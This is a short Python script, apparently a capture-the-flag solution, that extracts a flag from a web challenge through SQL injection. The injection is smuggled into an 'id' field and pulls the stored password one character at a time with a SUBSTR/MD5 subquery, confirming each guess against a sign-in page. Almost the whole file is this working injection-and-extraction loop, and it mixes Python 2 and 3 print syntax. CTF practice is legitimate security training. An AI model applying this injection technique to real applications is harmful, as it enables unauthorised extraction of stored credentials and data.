import requests
import string

output = 'SCTF{M34n1ng1e55_a1r_'
charset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ '

i = 500

while True:
    resp = requests.post("http://migration.sstf.site:5555/migrate.php", cookies={"id": "user{}".format(i), "pw": str(i)}, data={"id": "user{}', (SELECT MD5(SUBSTR((SELECT PW FROM information LIMIT 1),{},1))));-- -".format(i, len(output) + 1), "pw": ""})
    print(resp.text)
    if "Failed" in resp.text:
        continue
    for c in charset:
        resp2 = requests.post("http://migration.sstf.site:7777/signin.php", data={"id": "user{}".format(i), "pw": c})
        if "mathced" in resp2.text:
            continue
        output += c
        print "Found: ", output
        i += 1
        break

